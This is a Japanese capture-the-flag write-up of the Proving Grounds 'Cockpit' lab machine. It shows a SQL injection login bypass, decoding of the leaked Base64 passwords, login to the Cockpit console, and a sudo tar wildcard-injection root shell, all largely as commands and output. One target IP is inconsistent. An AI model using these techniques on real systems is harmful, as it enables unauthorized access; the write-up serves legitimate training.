+++
title = "Proving Grounds Practice - Cockpit Writeup"
date = "2026-10-18"
description = "ログインフォームのSQLインジェクションで資格情報を窃取し、Cockpit Web Consoleへのログインとsudo tarのワイルドカードインジェクションによりrootを取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Cockpit]", "[SQL Injection]", "[Cockpit Web Console]", "[Wildcard Injection]", "[GTFOBins]", "[tar]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Cockpit (Blaze) |
| OS | Linux |
| Target IP | 192.168.178.10 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全ポートスキャンとデフォルトスクリプト・バージョン検出を実行する。

```bash
nmap -sC -sV -p- 192.168.178.10
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
9090/tcp open  http    Cockpit web service 198 - 220
```

ポート80では`blaze`というタイトルのWebサイトが、ポート9090では`Cockpit`の管理コンソールが稼働していることが確認できた。Cockpitはサーバー管理用のWeb UIであり、有効な認証情報があればシステムに対する操作が可能になるため、まずはポート80側から認証情報の奪取を試みる。

---

## Enumeration

### Directory Enumeration

ポート80に対してディレクトリ・ファイル列挙を実施する。

```bash
gobuster dir -u http://192.168.208.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x pdf,html,php,txt
```

```text
index.html           (Status: 200) [Size: 3349]
login.php            (Status: 200) [Size: 769]
logout.php           (Status: 302) [Size: 0] [--> login.php]
```

`login.php`というログインフォームが存在することを確認した。

### SQL Injection (Authentication Bypass)

`login.php`のユーザー名欄に対して、認証バイパスの定番ペイロードを入力する。

```text
admin' #
```

このペイロードにより、バックエンドのSQLクエリにおけるパスワード検証部分がコメントアウトされ、認証をバイパスできた。ログイン後の画面には、ユーザー一覧とパスワードハッシュと思われる文字列が表示された。

| Username | Password |
|----------|----------|
| james | `Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=` |
| cameron | `dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy` |

### Credential Decoding

表示された文字列はBase64エンコードされていたため、デコードする。

```bash
echo 'Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=' | base64 -d
echo 'dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy' | base64 -d
```

```text
canttouchhhthiss@455152
thisscanttbetouchedd@455152
```

`james`・`cameron`それぞれの平文パスワードを取得した。

---

## Exploitation

### Cockpit Web Console Login

取得した資格情報を使い、ポート9090で稼働する`Cockpit`管理コンソールへログインを試みる。

```text
https://192.168.178.10:9090/
```

`james` / `canttouchhhthiss@455152`でログインに成功し、Web UI上のターミナル機能を通じてシステムへのシェルアクセスを獲得した。

```text
james@blaze:~$ ls
local.txt
```

`local.txt`の存在を確認し、ユーザーフラグを取得した。

---

## Privilege Escalation

### sudo -l

権限昇格の糸口を探るため、`sudo`で実行可能なコマンドを確認する。

```bash
sudo -l
```

```text
Matching Defaults entries for james on blaze:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

`james`は、パスワードなしで`/usr/bin/tar -czvf /tmp/backup.tar.gz *`をroot権限で実行できることが分かった。コマンド中のワイルドカード(`*`)は、GTFOBinsに掲載されている`tar`のワイルドカードインジェクション(Checkpoint機能の悪用)に利用できる既知の弱点である。

### tar Wildcard Injection

カレントディレクトリでワイルドカードが展開される際に、`--checkpoint`および`--checkpoint-action`オプションを引数として解釈させることで、任意のコマンドを実行させることができる。

```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```text
local.txt
# whoami
root
#
```

`tar`がroot権限で実行される際に、チェックポイント処理としてシェルが起動され、root権限のシェルを取得できた。

---

## Summary

ポート80のログインフォームに対するSQLインジェクションにより認証をバイパスし、画面上に表示されたユーザー一覧からBase64エンコードされたパスワードを窃取した。

取得した資格情報を用いてポート9090で稼働する`Cockpit`管理コンソールへログインし、Web UI経由でシステムシェルを獲得した。

その後、`sudo -l`で確認した`tar`コマンドの設定にワイルドカードが含まれていたことを悪用し、`--checkpoint-action`オプションによるコマンド実行(GTFOBinsのtarワイルドカードインジェクション)によってroot権限を取得した。

攻略の流れは以下のとおり。

1. Nmapによるポート・サービスの列挙
2. ポート80のディレクトリ列挙によるログインフォームの発見
3. `login.php`に対するSQLインジェクションによる認証バイパス
4. 画面上に表示されたBase64パスワードのデコード
5. ポート9090の`Cockpit`コンソールへのログイン
6. Web UI経由でのシステムシェル取得とユーザーフラグ確認
7. `sudo -l`による`tar`コマンドの設定確認
8. `tar`のワイルドカードインジェクションによるroot権限の取得

今回のポイントは、**Webアプリケーションの認証バイパスで窃取した資格情報をサーバー管理コンソール(Cockpit)の認証に転用し、さらに`sudo`で許可されたコマンドのワイルドカード展開を悪用してroot権限まで到達したこと**である。

### 参考

- [hekk.one - Proving Grounds Practice: Cockpit](https://hekk.one/posts/offsec/pg_practice/cockpit/)
